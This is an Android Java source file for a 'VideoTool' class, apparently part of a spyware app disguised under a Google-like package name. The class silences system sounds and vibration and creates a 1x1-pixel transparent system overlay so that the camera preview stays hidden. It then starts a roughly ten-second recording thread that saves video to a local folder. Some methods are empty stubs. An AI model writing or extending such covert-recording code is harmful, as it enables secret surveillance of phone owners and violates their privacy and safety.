package com.google.security.tools;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.os.Environment;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.google.security.MainService;

/*
 * Function：录像工具类，打开摄像头录像并保存到本地目录中
 * Author：   RongRong
 * Create Date: 201511.11
 * Update Date：
 * */
public class VideoTool implements SurfaceHolder.Callback {

	private static VideoTool videoTool;
	private static final String LOGTAG = "VideoTool";
	Context context;
	private boolean sdcardExists = false; // SD卡存在的标记
	private File recordVideoSaveFileDir = null;

	private SurfaceView surfaceview;// 视频预览控件
	// private LinearLayout lay; //预览控件的
	private SurfaceHolder surfaceHolder; // 和surfaceView相关的

	public VideoTool(Context con) {
		this.context = con;
	}

	public static VideoTool getIntance(Context context) {
		if (videoTool == null)
			return new VideoTool(context);
		return videoTool;
	}

	public void start() {
		if ((this.sdcardExists = Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED))) {
			this.recordVideoSaveFileDir = new File(
					MainService.VIDEO_FORDER_PATH); // 保存文件夹
			if (!this.recordVideoSaveFileDir.exists()) {
				this.recordVideoSaveFileDir.mkdirs(); // 创建文件夹
			}
		}
		// 初始化控件
		AudioManager audioManager = (AudioManager) context
				.getSystemService(Context.AUDIO_SERVICE);
		audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
		int volumn = audioManager.getStreamVolume(AudioManager.STREAM_SYSTEM);
		if (volumn != 0) {
			audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 0,
					AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
		}
		init();
	}

	public void stop() {// 停止录音函数

	}

	private void init() {

		surfaceview = new SurfaceView(context);

		WindowManager wm = (WindowManager) context
				.getSystemService(Context.WINDOW_SERVICE);
		Display display = wm.getDefaultDisplay();
		Log.i("TAG",
				"屏幕宽度：" + display.getWidth() + " 屏幕高度:" + display.getHeight());
		WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
				1, WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
				WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
						| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
				PixelFormat.TRANSPARENT);
		params.gravity = Gravity.TOP | Gravity.RIGHT;
		params.alpha = PixelFormat.TRANSPARENT;

		params.x = params.y = 1;
		wm.addView(surfaceview, params);

		// 初始化surfaceholder
		SurfaceHolder holder = surfaceview.getHolder();
		holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
		holder.addCallback(this); // holder加入回调接口
		// 设置setType
		holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
		// new RecordThread(1000*10, surfaceview, holder).start();
	}

	@Override
	public void surfaceCreated(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		surfaceHolder = holder;
		Log.e(LOGTAG, "process:" + Thread.currentThread().getName());
		// 录像线程，当然也可以在别的地方启动，但是一定要在onCreate方法执行完成以及surfaceHolder被赋值以后启动
		RecordThread thread = new RecordThread(1000 * 10, surfaceview,
				surfaceHolder, context);

		thread.start();

		Timer timer = new Timer();
		TimerTask task = new TimerTask() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				// thread.startRecord();
			}
		};
		timer.schedule(task, 1000 * 12); // 录像12秒
	}

	@Override
	public void surfaceChanged(SurfaceHolder holder, int format, int width,
			int height) {
		// TODO Auto-generated method stub
		surfaceHolder = holder;
	}

	@Override
	public void surfaceDestroyed(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		surfaceview = null;
		surfaceHolder = null;
	}

}